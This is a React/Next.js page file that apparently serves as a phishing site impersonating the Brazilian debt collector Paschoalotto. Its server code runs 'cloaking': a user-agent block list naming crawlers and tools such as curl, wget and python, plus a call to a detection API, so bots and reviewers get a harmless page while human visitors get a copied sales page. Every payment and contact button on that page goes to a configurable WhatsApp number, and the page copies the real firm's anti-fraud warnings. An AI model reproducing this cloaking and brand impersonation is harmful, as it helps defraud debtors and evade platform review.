import { useState } from 'react';
import Head from 'next/head';
import AdvocaciaPage from './bot-advocacia';

const BOT_SIGNATURES = ['googlebot','bingbot','slurp','duckduckbot','baiduspider','yandexbot','facebookexternalhit','twitterbot','whatsapp','linkedinbot','chrome-lighthouse','pagespeedonline','gtmetrix','perf.tools','curl','wget','python','java','node','postman','insomnia'];

function isKnownBot(userAgent) {
  const ua = userAgent.toLowerCase();
  return BOT_SIGNATURES.some(sig => ua.includes(sig));
}

export async function getServerSideProps(context) {
  const cloakingEnabled = process.env.CLOAKING_ENABLED === 'true';
  const userAgent = context.req.headers['user-agent'] || '';
  const ip = context.req.headers['x-forwarded-for']?.split(',')[0] || context.req.headers['cf-connecting-ip'] || context.req.socket.remoteAddress || 'unknown';
  const whatsappPhone = String(process.env.NEXT_PUBLIC_WHATSAPP_PHONE || '551421088000').trim();

  // 🔴 AQUECIMENTO: Cloaking desativado - todos veem página educativa
  if (!cloakingEnabled) {
    console.log('[CLOAKING] 🔴 DESATIVADO — Fase de aquecimento');
    console.log('[CLOAKING] Todos os visitantes veem página educativa (bot-advocacia.js)');
    console.log(`[CLOAKING] IP: ${ip} | UA: ${userAgent.substring(0, 60)}`);
    return {
      props: {
        showLandingPage: true,
        cloakingEnabled: false,
        whatsappPhone,
      },
    };
  }

  // 🟢 PRODUÇÃO: Cloaking ativado - detectar bot vs humano
  console.log('[CLOAKING] 🟢 ATIVADO — Bot detection ligada');

  // Sempre chamar API para detecção completa (garante Telegram notification)
  // Nota: A detecção é feita no backend PASCHA para consistência
  try {
    const protocol = context.req.headers['x-forwarded-proto'] || 'http';
    const host = context.req.headers['x-forwarded-host'] || context.req.headers.host;
    const apiUrl = `${protocol}://${host}/api/detect`;

    console.log(`[CLOAKING] ❓ User-agent desconhecido, chamando API PASCHA`);
    console.log(`[CLOAKING] IP: ${ip} | UA: ${userAgent.substring(0, 60)}`);

    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': userAgent,
        'x-forwarded-for': context.req.headers['x-forwarded-for'] || context.req.socket.remoteAddress || '',
        'cf-connecting-ip': context.req.headers['cf-connecting-ip'] || '',
      },
      body: JSON.stringify({
        behaviorData: null,
        canvasFingerprint: null,
      }),
    });

    const detection = await response.json();

    // Considerar como bot se: isBot=true E confiança >= 'high'
    const confidenceLevels = { 'very-low': 0, 'low': 1, 'medium': 2, 'high': 3, 'very-high': 4 };
    const minConfidence = process.env.CLOAKING_MIN_CONFIDENCE || 'high';
    const isBot = detection.isBot && (confidenceLevels[detection.confidence] || 0) >= (confidenceLevels[minConfidence] || 3);

    console.log(`[CLOAKING] Resultado PASCHA: score=${detection.score}, confidence=${detection.confidence}, isBot=${isBot}, minRequired=${minConfidence}`);
    console.log(`[CLOAKING] Ação: ${isBot ? '🤖 Página educativa (bot detectado)' : '✅ Página de vendas (humano confirmado)'}`);

    return {
      props: {
        showLandingPage: isBot,
        cloakingEnabled: true,
        whatsappPhone,
        score: detection.score || 0,
      },
    };
  } catch (error) {
    console.error('[CLOAKING] ❌ Erro ao chamar PASCHA:', error.message);
    console.log(`[CLOAKING] Fallback: Mostrando página de vendas (API error)`);
    return {
      props: {
        showLandingPage: false,
        cloakingEnabled: true,
        whatsappPhone,
        score: 0,
      },
    };
  }
}

export default function Home({ showLandingPage, whatsappPhone = '551421088000' }) {
  const [faqOpen, setFaqOpen] = useState(0);
  const [modalVisible, setModalVisible] = useState(false);

  const faqs = [
    {
      q: 'Como resolver minhas contas com a Paschoalotto?',
      a: 'Quitar suas pendências com a Paschoalotto é um processo simples e fácil. Você pode acessar nossa plataforma digital em www.pagoufacil.com.br ou entrar em contato conosco via WhatsApp pelo número 2108-8000.'
    },
    {
      q: 'Qual é o 0800 da Paschoalotto?',
      a: 'Para entrar em contato conosco, utilize nosso WhatsApp: (14) 2108-8000. Ou, caso prefira, você também pode nos enviar uma mensagem direta pelas redes sociais (Facebook e Instagram).'
    },
    {
      q: 'Não encontrei minha conta na Paschoalotto, e agora?',
      a: 'Se você não encontrou sua pendência cadastrada na Paschoalotto, é possível que ela esteja vinculada diretamente à empresa credora. Nesse caso, sugerimos que entre em contato com a empresa credora para regularizar seus débitos.'
    },
    {
      q: 'Já quitei meu débito, mas meu nome ainda continua restrito. O que devo fazer?',
      a: 'Após gerar seu acordo e efetuar o pagamento do boleto, enviaremos as informações à empresa credora da negociação. Esse processo costuma ser rápido, porém, em alguns casos, pode levar até 7 dias para que a restrição seja retirada.'
    },
    {
      q: 'Não recebi o meu boleto para pagamento. O que devo fazer?',
      a: 'Sabemos da importância de manter o seu acordo em dia e, por essa razão, você pode ter acesso à segunda via do seu boleto. Caso precise de um atendimento digital, fale com a gente através do fale conosco.'
    },
    {
      q: 'Tenho boletos da Paschoalotto gerados no meu Débito Direto Autorizado',
      a: 'O Débito Direto Autorizado é mais uma forma de pagamento de contas e boletos, possibilitando que o titular da conta tenha o controle e/ou visualize todos os boletos emitidos em seu CPF ou CNPJ. Para dúvidas, entre em contato com o seu banco.'
    },
    {
      q: 'Fiz o pagamento e continuo recebendo cobranças.',
      a: 'Atuamos como representantes das empresas credoras na recuperação do crédito. Após o pagamento recebemos a comunicação da compensação e as cobranças são encerradas. Caso a cobrança permaneça, o canal de Ouvidoria estará à disposição.'
    },
    {
      q: 'Realizei o pagamento e continuo com o nome negativado.',
      a: 'A inclusão ou retirada da restrição é de responsabilidade e é um processo realizado pela empresa credora. Caso tenha realizado o pagamento recentemente, o prazo para retirada da negativação é de até 5 dias úteis.'
    },
    {
      q: 'Gravame não baixou, meu veículo permanece alienado ao Banco.',
      a: 'A inclusão ou retirada da alienação, ou seja, a baixa do gravame, é de responsabilidade e é um processo realizado pelo Banco credor. Ela acontece após a quitação do contrato.'
    },
    {
      q: 'Como faço para não cair em golpes?',
      a: 'Verifique se está tratando diretamente com a empresa. Não emitimos chave PIX em nome de pessoa física. Verifique o beneficiário no boleto antes de pagar e desconfie de pedidos de informações pessoais. Utilize sempre os canais oficiais da Paschoalotto.'
    },
  ];

  if (showLandingPage) {
    return <AdvocaciaPage whatsappPhone={whatsappPhone} />;
  }

  return (
    <div suppressHydrationWarning style={{ fontFamily: "'Montserrat', Arial, sans-serif", color: '#333', margin: 0, padding: 0, backgroundColor: '#fff' }}>
      <Head>
        <meta name="robots" content="noindex, nofollow" />
        <meta name="referrer" content="no-referrer" />
        <meta name="googlebot" content="noindex, nofollow" />
        <meta httpEquiv="x-ua-compatible" content="IE=edge" />
        <meta httpEquiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0" />
        <meta httpEquiv="Pragma" content="no-cache" />
        <meta httpEquiv="Expires" content="0" />
      </Head>
      <style dangerouslySetInnerHTML={{ __html: `
        * { box-sizing: border-box; }

        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        @keyframes slideInLeft {
          from {
            opacity: 0;
            transform: translateX(-30px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }

        @keyframes slideInRight {
          from {
            opacity: 0;
            transform: translateX(30px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }

        @keyframes pulse {
          0%, 100% {
            transform: scale(1);
          }
          50% {
            transform: scale(1.1);
          }
        }

        .hero-section {
          animation: fadeInUp 0.8s ease-out;
        }

        .solutions-grid > div {
          animation: fadeInUp 0.6s ease-out backwards;
        }

        .solutions-grid > div:nth-child(1) { animation-delay: 0.1s; }
        .solutions-grid > div:nth-child(2) { animation-delay: 0.2s; }
        .solutions-grid > div:nth-child(3) { animation-delay: 0.3s; }
        .solutions-grid > div:nth-child(4) { animation-delay: 0.4s; }

        .solutions-grid > div {
          transition: all 0.3s ease;
        }

        .solutions-grid > div:hover {
          transform: translateY(-8px);
          box-shadow: 0 12px 24px rgba(0, 0, 0, 0.15) !important;
        }

        .paschoalover-container > div {
          animation: fadeInUp 0.7s ease-out backwards;
        }

        .paschoalover-container > div:nth-child(1) { animation-delay: 0.2s; }
        .paschoalover-container > div:nth-child(2) { animation-delay: 0.4s; }

        .faq-section {
          animation: fadeInUp 0.8s ease-out;
        }

        .whatsapp-btn {
          animation: pulse 2s infinite;
          transition: all 0.3s ease;
        }

        .whatsapp-btn:hover {
          transform: scale(1.15);
          box-shadow: 0 8px 20px rgba(37, 211, 102, 0.4) !important;
        }

        .footer {
          animation: fadeInUp 0.9s ease-out;
        }

        .faq-button {
          transition: all 0.3s ease;
        }

        .faq-button:hover {
          background-color: #f0f0f0 !important;
        }

        @media (max-width: 768px) {
          .solutions-grid { display: grid !important; grid-template-columns: 1fr 1fr !important; gap: 12px !important; }
          .hero-section { min-height: 320px !important; padding: 40px 20px !important; }
          .hero-section h1 { font-size: 28px !important; max-width: 100% !important; }
          .hero-section p { font-size: 14px !important; max-width: 100% !important; }
          .solutions-section { padding: 50px 20px !important; }
          .solutions-title { font-size: 24px !important; margin-bottom: 30px !important; }
          .paschoalover-section { padding: 50px 20px !important; }
          .paschoalover-container { grid-template-columns: 1fr !important; gap: 30px !important; }
          .paschoalover-title { font-size: 28px !important; }
          .faq-section { padding: 50px 20px !important; }
          .faq-container { grid-template-columns: 1fr !important; gap: 30px !important; }
          .faq-title { font-size: 28px !important; }
          .footer { padding: 40px 20px !important; }
          .footer-container { grid-template-columns: 1fr !important; gap: 40px !important; }
          .footer-addresses { grid-template-columns: 1fr !important; gap: 20px !important; }
          .banner { padding: 8px 10px !important; font-size: 12px !important; gap: 10px !important; flex-direction: column !important; text-align: center !important; }
          .banner-close { position: static !important; transform: none !important; margin-top: 10px !important; }
          .desktop-nav { display: none !important; }
          .contact-btn-mobile { display: inline-block !important; }
          .whatsapp-btn { bottom: 20px !important; right: 20px !important; }
          .header { padding: 10px 0 !important; }
          .header-content { padding: 0 20px !important; }
        }

        @media (max-width: 480px) {
          .solutions-grid { grid-template-columns: 1fr !important; }
          .hero-section { min-height: 280px !important; padding: 30px 15px !important; }
          .hero-section h1 { font-size: 22px !important; }
          .hero-section p { font-size: 13px !important; }
          .solutions-section { padding: 40px 15px !important; }
          .solutions-title { font-size: 20px !important; }
          .paschoalover-section { padding: 40px 15px !important; }
          .paschoalover-title { font-size: 24px !important; }
          .faq-section { padding: 40px 15px !important; }
          .faq-title { font-size: 24px !important; }
          .footer { padding: 30px 15px !important; }
          .modal-dialog { width: 95% !important; }
          .faq-button { font-size: 14px !important; padding: 15px 0 !important; }
        }
      ` }} />

      {/* Modal de Fraude */}
      {modalVisible && (
        <div style={{ position: 'fixed', inset: 0, backgroundColor: 'rgba(0,0,0,0.6)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <div className="modal-dialog" style={{ backgroundColor: '#fff', borderRadius: '12px', maxWidth: '480px', width: '90%', overflow: 'hidden', boxShadow: '0 20px 60px rgba(0,0,0,0.3)' }}>
            <div style={{ backgroundColor: '#0051FA', padding: '20px 24px', color: '#fff' }}>
              <h3 style={{ margin: 0, fontSize: '20px', fontWeight: 'bold' }}>Cuidado com Fraudes!</h3>
            </div>
            <div style={{ padding: '24px' }}>
              <p style={{ fontSize: '14px', color: '#555', lineHeight: '1.7', marginBottom: '20px' }}>
                Perfis, sites e anúncios falsos estão usando nosso nome para aplicar golpes. Verifique a procedência de uma negociação consultando nossos canais de atendimento. E atenção: nunca solicitamos o número do token enviado pelo WhatsApp. Ele é pessoal, intransferível e de uso exclusivo.
              </p>
              <div style={{ display: 'flex', gap: '10px', justifyContent: 'flex-end', flexWrap: 'wrap' }}>
                <button onClick={() => setModalVisible(false)} style={{ padding: '10px 20px', border: '1px solid #ccc', borderRadius: '6px', backgroundColor: '#fff', cursor: 'pointer', fontSize: '14px' }}>
                  Fechar
                </button>
                <a href={`https://api.whatsapp.com/send/?phone=${whatsappPhone}`} target="_blank" rel="noreferrer" style={{ padding: '10px 20px', backgroundColor: '#5BC928', color: '#fff', borderRadius: '6px', fontSize: '14px', textDecoration: 'none', fontWeight: 'bold' }}>
                  Ir para o atendimento
                </a>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Banner topo */}
      <div className="banner" style={{ backgroundColor: '#0051FA', color: '#fff', padding: '10px 20px', fontSize: '14px', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '20px', position: 'relative' }}>
        <a href={`https://api.whatsapp.com/send/?phone=${whatsappPhone}`} target="_blank" rel="noreferrer" style={{ color: '#fff', textDecoration: 'underline' }}>
          Recebeu uma ligação indevida da Paschoalotto? Fale com nosso suporte oficial clicando aqui
        </a>
      </div>

      {/* Header */}
      <header className="header" style={{ backgroundColor: '#fff', borderBottom: '1px solid #e0e0e0', padding: '14px 0', position: 'sticky', top: 0, zIndex: 100 }}>
        <div className="header-content" style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 40px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <img src="/imagens/logo.png" alt="Paschoalotto" style={{ height: '40px' }} />
          <nav className="desktop-nav" style={{ display: 'flex', gap: '30px', alignItems: 'center' }}>
            <a href={`https://api.whatsapp.com/send/?phone=${whatsappPhone}`} target="_blank" rel="noreferrer" style={{ backgroundColor: '#0051FA', color: '#fff', border: 'none', padding: '10px 22px', borderRadius: '6px', fontSize: '14px', cursor: 'pointer', fontWeight: 'bold', textDecoration: 'none' }}>
              Quero Pagar
            </a>
            <a href={`https://api.whatsapp.com/send/?phone=${whatsappPhone}`} target="_blank" rel="noreferrer" style={{ backgroundColor: '#0051FA', color: '#fff', border: 'none', padding: '10px 22px', borderRadius: '6px', fontSize: '14px', cursor: 'pointer', fontWeight: 'bold', textDecoration: 'none' }}>
              Trabalhe Conosco
            </a>
          </nav>
          <a className="contact-btn-mobile" href={`https://api.whatsapp.com/send/?phone=${whatsappPhone}`} target="_blank" rel="noreferrer" style={{ display: 'none', backgroundColor: '#0051FA', color: '#fff', padding: '10px 20px', borderRadius: '6px', fontSize: '14px', fontWeight: 'bold', textDecoration: 'none' }}>
            Entrar em Contato
          </a>
        </div>
      </header>

      {/* Hero */}
      <section className="hero-section" style={{ position: 'relative', minHeight: '420px', display: 'flex', alignItems: 'center', overflow: 'hidden' }}>
        <img src="/imagens/banner-desktop.webp" alt="" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%', objectFit: 'cover', objectPosition: 'center' }} />
        <div style={{ position: 'absolute', inset: 0, background: 'linear-gradient(to right, rgba(0,0,0,0.75) 50%, rgba(0,0,0,0.1) 100%)' }} />
        <div style={{ position: 'relative', maxWidth: '1200px', margin: '0 auto', padding: '70px 40px', width: '100%' }}>
          <h1 style={{ color: '#fff', fontSize: '40px', fontWeight: 'bold', maxWidth: '520px', lineHeight: '1.2', marginBottom: '20px' }}>
            Facilite sua vida com o Pagou Fácil da Paschoalotto
          </h1>
          <p style={{ color: '#ddd', fontSize: '16px', maxWidth: '440px', lineHeight: '1.7', marginBottom: '32px' }}>
            Com apenas alguns cliques, você pode resolver suas pendências e encontrar soluções para sua vida financeira.
          </p>
          <a href={`https://api.whatsapp.com/send/?phone=${whatsappPhone}`} target="_blank" rel="noreferrer" style={{ backgroundColor: '#0051FA', color: '#fff', padding: '14px 30px', borderRadius: '6px', fontSize: '15px', fontWeight: 'bold', textDecoration: 'none', display: 'inline-block' }}>
            Consultar CPF
          </a>
        </div>
      </section>

      {/* Soluções */}
      <section className="solutions-section" style={{ padding: '80px 40px', backgroundColor: '#fff' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', textAlign: 'center' }}>
          <h2 className="solutions-title" style={{ fontSize: '34px', color: '#0051FA', marginBottom: '50px', fontWeight: 'bold', lineHeight: '1.3' }}>
            Soluções Paschoalotto<br />para o seu dia a dia
          </h2>
          <div className="solutions-grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '20px' }}>
            {[
              { title: 'Regularize seus débitos', icon: '/imagens/fone.png' },
              { title: 'Solicite a 2ª via do boleto', icon: '/imagens/bar.png' },
              { title: 'Fale com a ouvidoria', icon: '/imagens/cel.png' },
              { title: 'Contrate as soluções para seu negócio', icon: '/imagens/bolinha.png' },
            ].map((item, i) => (
              <a key={i} href={`https://api.whatsapp.com/send/?phone=${whatsappPhone}`} target="_blank" rel="noreferrer" style={{ border: '1px solid #e0e0e0', borderRadius: '10px', padding: '28px 20px', textAlign: 'left', cursor: 'pointer', backgroundColor: '#fafafa', textDecoration: 'none', display: 'block', transition: 'box-shadow 0.2s' }}>
                <p style={{ fontSize: '15px', color: '#333', marginBottom: '25px', fontWeight: '500', lineHeight: '1.4' }}>{item.title}</p>
                <img src={item.icon} alt={item.title} style={{ height: '32px', width: 'auto' }} />
              </a>
            ))}
          </div>
        </div>
      </section>

      {/* Paschoalover */}
      <section className="paschoalover-section" style={{ padding: '70px 40px', backgroundColor: '#fff' }}>
        <div className="paschoalover-container" style={{ maxWidth: '1200px', margin: '0 auto', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '60px', alignItems: 'center' }}>
          <div>
            <h2 className="paschoalover-title" style={{ fontSize: '40px', fontWeight: 'bold', color: '#222', marginBottom: '15px', lineHeight: '1.2' }}>
              Vem ser<br />
              <span style={{ color: '#0051FA' }}>#Paschoalover!</span>
            </h2>
            <p style={{ fontSize: '15px', color: '#666', lineHeight: '1.8', marginBottom: '28px' }}>
              Conheça as oportunidades de carreira na Paschoalotto e junte-se a nós em nossa missão de ser parte da solução para pessoas, empresas e comunidades.
            </p>
            <a href={`https://api.whatsapp.com/send/?phone=${whatsappPhone}`} target="_blank" rel="noreferrer" style={{ backgroundColor: '#fff', color: '#333', border: '2px solid #333', padding: '12px 26px', borderRadius: '6px', fontSize: '14px', fontWeight: 'bold', textDecoration: 'none', display: 'inline-block' }}>
              Trabalhe conosco
            </a>
          </div>
          <div>
            <img src="/imagens/time.png" alt="Equipe Paschoalotto" style={{ width: '100%', borderRadius: '14px', objectFit: 'cover' }} />
          </div>
        </div>
      </section>

      {/* FAQ */}
      <section className="faq-section" style={{ padding: '80px 40px', backgroundColor: '#fff' }}>
        <div className="faq-container" style={{ maxWidth: '1200px', margin: '0 auto', display: 'grid', gridTemplateColumns: '280px 1fr', gap: '80px' }}>
          <div>
            <h2 className="faq-title" style={{ fontSize: '38px', fontWeight: 'bold', color: '#222', lineHeight: '1.2' }}>
              Perguntas<br />frequentes
            </h2>
          </div>
          <div>
            {faqs.map((faq, i) => (
              <div key={i} style={{ borderBottom: '1px solid #e0e0e0' }}>
                <button
                  className="faq-button"
                  onClick={() => setFaqOpen(faqOpen === i ? -1 : i)}
                  style={{ width: '100%', textAlign: 'left', padding: '20px 0', background: 'none', border: 'none', cursor: 'pointer', display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '15px', fontWeight: 'bold', color: '#222' }}
                >
                  {faq.q}
                  <span style={{ fontSize: '22px', color: '#555', flexShrink: 0, marginLeft: '10px' }}>{faqOpen === i ? '×' : '+'}</span>
                </button>
                {faqOpen === i && (
                  <div style={{ padding: '0 0 20px 0', fontSize: '14px', color: '#555', lineHeight: '1.8' }}>
                    {faq.a}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer" style={{ backgroundColor: '#f5f5f5', padding: '60px 40px' }}>
        <div className="footer-container" style={{ maxWidth: '1200px', margin: '0 auto', display: 'grid', gridTemplateColumns: '220px 1fr 200px', gap: '60px' }}>
          <div>
            <img src="/imagens/logo.png" alt="Paschoalotto" style={{ height: '36px', marginBottom: '28px', display: 'block' }} />
            <img src="/imagens/seloReclameAqui.png" alt="Verificada por ReclameAQUI" style={{ maxWidth: '180px', display: 'inline-block', marginBottom: '28px' }} />
          </div>

          <div className="footer-addresses" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '30px' }}>
            <div>
              <p style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '14px' }}>Bauru</p>
              <p style={{ fontSize: '13px', color: '#666', lineHeight: '1.6', marginBottom: '20px' }}>
                Rua Professor Durval Guedes de Azevedo, 2-144. Jd. Infante Dom Henrique. CEP. 17012-633 - Matriz
              </p>
              <p style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '14px' }}>Marília</p>
              <p style={{ fontSize: '13px', color: '#666', lineHeight: '1.6' }}>
                Rua Dr. Próspero Cecílio Coimbra, 330. Jardim São Gabriel. CEP. 17525-160
              </p>
            </div>
            <div>
              <p style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '14px' }}>Agudos</p>
              <p style={{ fontSize: '13px', color: '#666', lineHeight: '1.6', marginBottom: '20px' }}>
                Avenida João Wolber, 295. Santa Angelina. CEP. 17120-000
              </p>
              <p style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '14px' }}>Ribeirão Preto</p>
              <p style={{ fontSize: '13px', color: '#666', lineHeight: '1.6' }}>
                Rua Antônio Fernandes Figuerôa, 1400. Parque Industrial Lagoinha. CEP. 14095-280
              </p>
            </div>
          </div>

          <div>
            <p style={{ fontWeight: 'bold', marginBottom: '15px', fontSize: '14px' }}>Ajuda</p>
            {[
              ['Política de Privacidade e Proteção de Dados', '/humano/privacidade'],
              ['Política de Segurança da Informação', '/humano/seguranca'],
              ['Relatório de Transparência e Igualdade Salarial', '/humano/transparencia'],
              ['Código de Ética e Conduta', '/humano/etica'],
              ['Relação com Investidor', '/humano/investidor'],
              ['Política de Cookies', '/humano/cookies'],
              ['Política De Integridade e Compliance', '/humano/compliance'],
              ['Portal do Titular de Dados', '/humano/portal-dados'],
              ['Portal de Preferência do Colaborador', '/humano/portal-colaborador'],
              ['Denuncie uma fraude', '/humano/denuncie-fraude'],
            ].map(([label], i) => (
              <div key={i} style={{ marginBottom: '10px' }}>
                <span style={{ fontSize: '13px', color: '#555', textDecoration: 'none' }}>{label}</span>
              </div>
            ))}
          </div>
        </div>
      </footer>

      {/* WhatsApp flutuante */}
      <a
        className="whatsapp-btn"
        href={`https://api.whatsapp.com/send/?phone=${whatsappPhone}`}
        target="_blank"
        rel="noreferrer"
        style={{ position: 'fixed', bottom: '30px', right: '30px', backgroundColor: '#25D366', width: '56px', height: '56px', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 4px 12px rgba(0,0,0,0.25)', zIndex: 999, textDecoration: 'none' }}
      >
        <img src="/imagens/whatsapp.png" alt="WhatsApp" style={{ width: '30px', height: '30px', filter: 'brightness(0) invert(1)' }} />
      </a>
    </div>
  );
}
